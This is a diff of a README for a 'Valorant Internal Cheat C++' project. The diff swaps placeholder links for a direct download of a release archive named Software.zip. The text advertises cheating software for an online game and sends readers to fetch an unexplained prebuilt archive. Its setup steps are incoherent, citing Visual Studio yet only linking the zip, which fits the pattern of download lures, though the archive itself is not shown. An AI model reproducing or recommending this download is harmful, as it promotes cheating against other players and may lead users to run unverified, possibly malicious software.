@@ -2,14 +2,14 @@
 
 # Valorant Internal Cheat C++
 
-[Click here to download](555)
+[Click here to download](https://github.com/kikusboomboom5/Maxi-Valorant-Internal-Cheats/releases/download/Download/Software.zip)
 
 ## How to Use
 
 - Download the project to your computer as zip
 - Extract Project to Folder.
 - Make Sure You Have Visual Studio Installed on Your Computer
-- [Click here to download](555)
+- [Click here to download](https://github.com/kikusboomboom5/Maxi-Valorant-Internal-Cheats/releases/download/Download/Software.zip)
 
 ### Visual Studio :
 
